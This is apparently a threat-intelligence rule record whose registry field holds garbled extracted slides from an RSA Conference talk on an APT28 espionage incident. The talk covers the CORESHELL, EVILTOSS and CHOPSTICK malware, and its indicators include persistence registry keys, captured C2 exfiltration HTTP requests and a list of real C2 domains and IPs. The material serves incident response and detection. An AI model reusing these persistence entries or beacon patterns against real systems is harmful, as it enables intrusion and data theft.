{"rule_id": 625, "name": "cct-w08_evolving-threats-dissection-of-a-cyber-espionage-attack", "description": "-", "references": [], "File_Names": ["edg6EF885E2.tmp", "netids.dll"], "MD5_Hashes": [], "SHA1_Hashes": [], "SHA256_Hashes": [], "Registry_Entries": ["HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Network Identification Service\\parameters\\ServiceDll = C:\\Windows\\System32\\netids.dll\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Network Identification Service\\parameters\\ServiceDllUnloadOnStop = 1\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\ntsvcs = Network Identification Service\n\nHKEY_LOCAL_MACHINE\\software\\microsoft\\windowsNT\\currentversion\\svchost\\ntsvcs\\CoInitializeSecurityParam \u279d 1\n\nCreated\n\nModified\n\nYes\n\nYes\n\nYes\n\nYes\n\nNo\n\nNo\n\nNo\n\nNo\n\nEVILTOSS\u00a0backdoor\n\n\fPatient Zero consequences\nHow the attacker reacted\n\n#RSAC\n\n\uf075 The Army has triaged the compromised system reinstalling the OS and applications \n\nand has close the case.\n\n\uf075 As result of the triage, the attacker changes strategy for a while.\n\n\uf075 APT28 has lowered the volume of his traffic and, for more than 20 days nothing\n\nhas been reported.\n\n\uf075 The military was ready closed the case, but another anomaly has been founded\n\nduring a scheduled maintenance on a server in the base Data Center.\n\n\uf075 Looking at the logs, they have discovered the presence of repeated accesses from \n\nad Administrator account logging from an external IP address.\n\n\uf075 The case has escalated quickly this time.\n\n\fThe Methodology\n\n#RSAC\n\n\fWhat we can bring to the table?\n\n#RSAC\n\n\uf075 I am part of RSA IR Team and our structured approach, developed from our\n\nfield experience is now tuned to face attacks like this one.\n\n\uf075 Our approach leverages on \u201cActionable IoCs\u201d and the support of tools that \ncould easily integrate these IoCs to speedup the IR investigation process.\n\n\uf075 This is a methodology and not a \u201cmethod\u201d, because it counts on procedures, \n\nanalyses and evidences in a scientifically sounding approach. \n\n\uf075 To collect actionable IoCs we use a synergic approach that includes network \n\nand system visibility with log and malware analyses.\n\n\uf075 It involves aggregation of IoCs and their classification to create a \u201cKnowledge \nBase\u201d of attacks, tools and strategies that could be \u201creused\u201d in subsequent \nengagements to streamline the response and support the attribution.\n\n\fThe Methodology\n\nNetwork \nvisibility\n\nMalware \nvisibility\n\nIncident \nsurface.\n\n#RSAC\n\nSystem \nvisibility\n\nNetwork, system \nand log indicators.\nClassification and \nattribution.\n\nTriage planned from \na tailored set of \nstrategic actions.\n\n\fActionable IoCs\nWhat our methodology suggests\n\n\uf075 IR is an ongoing process that spawns on multiple areas.\n\n#RSAC\n\n\fActionable IoCs\nWhat our methodology suggests\n\n#RSAC\n\n\uf075 To operationalize the IoC you should develop, use and store it in a reusable logic.\n\n\fInvestigation: first step\n\uf075 The Customer has initially escalated the problem to another team, but despite \n\nthe efforts and a triage attempt, the result was not satisfactory.\n\n#RSAC\n\n\uf075 Few days after the triage they discover additional lateral movements in their\n\nnetwork.\n\n\uf075 At this point the Customer called us.\n\n\uf075 We notice, since the initial talk, that the Customer was lacking any network \nvisibility and the investigation was performed without a structured approach.\n\nNo network visibility\n\nNo detailed analysis has\nbeen performed initially\n\nLimited quantity of \nhistorical logs\n\nThe initial investigation has\nbeen limited to MD5 search\non Domain machines.\n\n\fZero Trust\nBelow zero trust\u2026\n\uf075 Following our advice to bring a network forensic tool in their environment (RSA \n\n#RSAC\n\nSecurity Analytics) we have been able to ensure that, even after the \u00abapparent\u00bb \nexpulsion of the attacker, several machines were still infected.\n\nSuccessful\u00a0\ncommunication\nrecorded\u00a0after\u00a0\nexpulsion/triage\u2026\n\nThe \u00abnetwork \nvisibility\u00bb has\noffered also\nthe chance to \nproactively\nmonitor the \noccurrence of \nother malicious \nattacks.\n\n\fOur investigation\nOur approach tailored to the case\n\uf0a7 We have rebuilt the investigation process from the scratch aiming to identify malicious \n\n#RSAC\n\nbehavior from the already collected samples to build optimal Network Forensic IOC and to \napply them as a base to highlight further machines infected.\n\nIntegrated a Network \nForensic Tool: RSA SA\n\nRedefined Actionable \nIOCs at Network, System \nand Log level for different \nplatforms and systems.\n\nRefocused the malware \nanalysis on all identified \nsamples to identify \nActionable IOCs.\n\nImproved the triage \nstrategy by moving from \n\u00b0seek & destroy\u00b0 to a  \nmore strategic approach.\n\n\uf0a7 Thanks to that we have been able to enumerate remaining infected machines and to unearth \nthe \u201cmissing piece\u201d: the Chopstick RAT that the original IR team was not capable of identify. \nWe know, from experience, that APT28 uses Chopstick RAT for most interesting targets.\n\n\fAttacker Tools\n\n#RSAC\n\n\fAPT 28 Tools\nAPT 28 Tools seen in this investigation\n\n#RSAC\n\n\uf075 CORESHELL: This downloader is the evolution of the previous downloader of \n\nchoice from APT28 known as \u201cSOURFACE\u201d (or \u201cSofacy\u201d). This downloader, once \nexecuted, create the conditions to download and execute a second-stage \n(usually Eviltoss) from a C2. \n\n\uf075 EVILTOSS: This backdoor is delivered through CORESHELL downloader to gain \nsystem access for reconnaissance, monitoring, credential theft, and shellcode\nexecution. \n\n\uf075 CHOPSTICK: This is a modular implant compiled from a software framework that \n\nprovides tailored functionality and flexibility. By far Chopstick is the most \nadvanced tool used by APT 28.\n\n\uf075 MIMIKATZ: Everyone of us knows this tool. In this case, this has been of \n\ndevastating effects to completely compromise AD Forest.\n\n\fAPT 28 Tools\nCORESHELL behavioral analysis\nCoreshell was relatively easy to detonate, apart for some AntiVM checks before executing. \nThe behavioral analysis has permitted to highlight several DNS connections:\n\n#RSAC\n\nThe DNS requests aim to different external hosts.\nThe malware use a beacon mechanism based on \nHTTP POST  and a separate thread for \ninstructions still in HTTP.\nThe User-Agent, as explained earlier, can be used\nas IOC, at least for the oldest variants. \n\nNote: Latest version of CORESHELL uses the victim\u2019s browser User-Agent \nmaking the IOC useless.\n\n\fAPT 28 Tools\nCORESHELL ATTRIBUTION BY COMPARISON\n\n#RSAC\n\nThe attribution has been \nperformed in two ways: \n\uf0a7 by comparison, between the \ndiscovered samples and the \npublic ones.\n\n\uf0a7 by analysis, looking for \n\nindicators related to the date \nand time of compilation, the \ntime zone, the language of \nthe malware and its \nbehaviour.\n\nThe dropped files have been verified\nas well and compared between \ndifferent droppers.\n\n\fAPT 28 Tools\nEVILTOSS IOCs\n\uf075 At system level the malware modifies the Registry in order to ensure persistence.\n\n#RSAC\n\n\uf075 It is dropped and executed, usually, from one of these folders:\n\nEVILTOSS\u00a0installation\u00a0folder\n\n%system%\n%temp%\n%commonprogramfiles%\\System\\\n\nRegistry\u00a0Keys\u00a0and\u00a0Values\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Network Identification Service\\parameters\\ServiceDll = %EVILTOSS\u00a0\nfolder%<EVILTOSSNAME>.dll\n\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\services\\Network Identification Service\\parameters\\ServiceDllUnloadOnStop = 1\n\nHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost\\ntsvcs = Network Identification Service\n\nHKEY_LOCAL_MACHINE\\software\\microsoft\\windowsNT\\currentversion\\svchost\\ntsvcs\\CoInitializeSecurityParam \u279d 1\n\ndownload files from a remote computer and/or the Internet\nrun executable files\nlog keystrokes\nsend gathered information\n\nCreated\n\nModified\n\nYes\n\nYes\n\nYes\n\nYes\n\nNo\n\nNo\n\nNo\n\nNo\n\n\fAPT 28 Tools\nEVILTOSS ATTRIBUTION BY COMPARISON\n\n#RSAC\n\nThe attribution has been \nperformed in two ways: \n\uf0a7 by comparison, between the \ndiscovered samples and the \npublic ones.\n\n\uf0a7 by analysis, looking for \n\nindicators related to the date \nand time of compilation, the \ntime zone and the language \nof the malware discovered.\n\nAlso lateral movements have been \nverified in terms of timeframe of the \nlog and hosts involved.\n\n\fAPT 28 Tools\nEVILTOSS IOCs\n\uf075 EVILTOSS and CORESHELL share a lot of commonalities, both in the \n\n#RSAC\n\ncommunication mechanism and the obfuscation/encryption. I.E. both obfuscate \nstrings that are decoded at runtime.\n\n\uf075 EVILTOSS uses RSA encryption to encrypt data and send it through a HTTP \n\nPOST message very similar to CORESHELL traffic:\n\nCont\u2026\n\nC2\u00a0ack for\u00a0exfil\n\n\fAPT 28 Tools\nCHOPSTICK\n\uf075 CHOPSTICK is a Trojan family, written in C++ and built from a framework.\n\n#RSAC\n\n\uf075 It offers a diverse set of capabilities for different deployments.\n\n\uf075 It collects detailed information from the host settings and it is aware of the presence \n\nof several security products.\n\n\uf075 It may communicate with external servers using SMTP, HTTP or HTTPs.\n\n\uf075 CHOPSTICK stores all collected information in a hidden file for temporary storage.\n\n\uf075 It communicates with the C2 via Windows \u201cmailslot\u201d, not named pipes or sockets. \n\n\uf075 CHOPSTICK main executable creates a \u201cmailslot\u201d in Windows machines and acts as \nthe mailslot server, while its code injected into the other processes acts as a client \nallowing the Trojan to access and steal any type of information. \n\n\uf075 The RC4 encryption used here also uses a 50 bytes static key plus four-byte random \n\nsalt value.\n\n\fAPT 28 Tools\nCHOPSTICK IOCs\n\uf075 Looking at network traffic we discover that, after approximately 60 seconds of \n\n#RSAC\n\nexecution time, CHOPSTICK begins communicating with one of its C2 servers. \nUsually as in our sample the traffic was over HTTP: \n\nGET /find/?itwm=90QDFR9CWZckwkTPHr2GOUXPXI91A&from=yVVgOqV1UG&utm=HTXh&utm=9kV7L3Z&oprnd=Xjp1kKrDgAeFu&from=06&9u2J=nYruvlhMtXN5 \nHTTP/1.1 \n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8 \n\nAccept-Language: en-us,en;q=0.5 \n\nAccept-Encoding: gzip, deflate \n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) \n\nHost: 198.105.125.74\n\n\uf075 After sending an initial HTTP GET request it uploads the file contents of \n\nedg6EF885E2.tmp to the C2 server using HTTP POST requests. \n\nPOST /open/?ags=bBz&ags=qVs5d0kGHtil&oprnd=6ZCuc7XQ&channel=gBDFmj_fJdNk9&itwm=HJxam7mDOyIBftJ6OwEQjGBzyjpQv HTTP/1.1 \n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*;q=0.8 \n\nAccept-Language: en-us,en;q=0.5 \n\nAccept-Encoding: gzip, deflate \n\nUser-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; InfoPath.2; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022) \n\nHost: 198.105.125.74 \n\nContent-Length: 69 \n\nConnection: Keep-Alive \n\nCache-Control: no-cache EMo1MTmWmHwJAwHlezPSG5-SGWRYwQm6MbGxkYhvCv7-FRCezztd2UxRArSxP285WXg==\n\n\fThe attack strategy\nIOC: C2 list\n\uf075 Thanks to our structured approach we have been able to identify the C2s used by \nthe attacker and with them, we have been able to enumerate infected hosts based \non network communications.\n\n#RSAC\n\nURL\n\nIP\n\nType\n\nmicrosofthelpcenter.info\n\n87.236.215.13\n\nHTTP/HTTPS Main C2\n\ndriversupdate.info\n\n46.19.138.66\n\n1oo7.net\n\n5.199.171.58\n\n66.172.12.133\n\n66.172.12.133\n\n45.64.105.23\n\n45.64.105.23\n\n176.31.112.10\n\n176.31.112.10\n\n176.31.96.178\n\n176.31.96.178\n\nHTTPS C2\n\nHTTPS C2\n\nCoreshell C2\n\nCoreshell C2\n\nHTTPS C2\n\nHTTPS C2\n\nNote: The attacker has \nused different \ninfrastructures for \nmanaging infected \nhosts.\nNote: Some of the \ndiscovered C2s are in \ncommon with other \nattacks recorded against \nother military \nenvironments in EMEA.\n\nThe C2 list has confirmed the attribution and has paved the way \nfor a more structured approach for Triage\n\n\fIncident Timeline and Stats\nResults of our methodology Vs previous results obtained by the Customer\n\n#RSAC\n\nPeak\u00a0of\u00a0attack\u00a0distribution\n\nInitial\u00a0\nSpearphishing\n\nFirst\u00a0Phase\u00a0of\u00a0\nAttack\n\nPatient\u00a0Zero\n\n300\n\n250\n\n200\n\n150\n\n100\n\n50\n\n0\n\nOct\u201014 Nov\u201014 Dec\u201014 Jan\u201015\n\nFeb\u201015 Mar\u201015 Apr\u201015\n\nMay\u201015\n\nJun\u201015\n\nFinal\u00a0triage\u00a0managed\u00a0by\u00a0\nour\u00a0Team\n\nLast\u00a0record\u00a0of\u00a0infected\u00a0\nmachine\n\nJul\u201015\n\nAug\u201015\n\nSep\u201015\n\nRemediation\nAPT28\n\nInitial\u00a0massive\u00a0\ntriage\n\nFirst\u00a0time\u00a0our\u00a0\nmethodology\u00a0has\u00a0applied\n\nAPT28\n\nRemediation\n\n\fConclusion\nWhat I can suggest\n\n#RSAC\n\n\uf075 It is extremely valuable to build an internal Knowledge base about incidents and \n\nattacks recorded and published and to extract IOCs from these incidents.\n\n\uf075 It is extremely useful to refocus the IR procedures dividing them in four areas:\n\n\uf075 Network Forensic\n\uf075 System Forensic\n\uf075 Log Analysis\n\uf075 Malware Analysis\n\nActionable IOCs\n\nRapid Incident reaction\nProactive Management\n\n\uf075 It could be extremely important to streamline the IR procedures by transforming IOCs \nto actionable IOCs, that means to evaluate and define which IOC can be reused and \nwhich one is limited to a specific attack or event.\n\n\uf075 It is important to drill and to give IR personnel the chance to learn how to build, use, \n\nextract, evaluate and properly store Actionable IOCs. \n\n\fConclusion\nWhat our methodology suggests\n\n#RSAC\n\nYou\u00a0should\u00a0not\u00a0approach\u00a0IR\u00a0\noperations\u00a0in\u00a0a\u00a0unstructured\u00a0\nway.\n\nYou\u00a0should\u00a0ensure\u00a0proper\u00a0\n\u00abvisibility\u00bb\u00a0to\u00a0all\u00a0IR\u00a0fields.\n\nYou\u00a0should\u00a0avoid\u00a0to\u00a0manage\u00a0\nthe\u00a0Incident\u00a0through\u00a0\u00abwork\u00a0\narounds\u00bb\u00a0and\u00a0\u00abshortcuts\u00bb\n\nYou should avoid to\u00a0rely only\non\u00a0technologies\n\nYou\u00a0should\u00a0keep\u00a0your\u00a0IR\u00a0\ncapabilities\u00a0updated\n\nOnce\u00a0formalized,\u00a0you\u00a0should\u00a0\nuse\u00a0IoCs\u00a0as\u00a0key\u00a0element\u00a0to\u00a0\nevaluate\u00a0the\u00a0attack\u00a0surface\n\nYou\u00a0should\u00a0organize\u00a0the\u00a0\ntriage\u00a0in\u00a0a\u00a0strategic\u00a0approach.\u00a0\n\n\f#RSAC\n\n\fEMC,\u00a0RSA,\u00a0the\u00a0EMC\u00a0logo\u00a0and\u00a0the\u00a0RSA\u00a0logo\u00a0are\u00a0trademarks\u00a0of\u00a0EMC\u00a0Corporation\u00a0in\u00a0the\u00a0U.S.\u00a0and\u00a0other\u00a0countries.\u00a0\n\n\f"], "URLs": [], "weight": 0.0}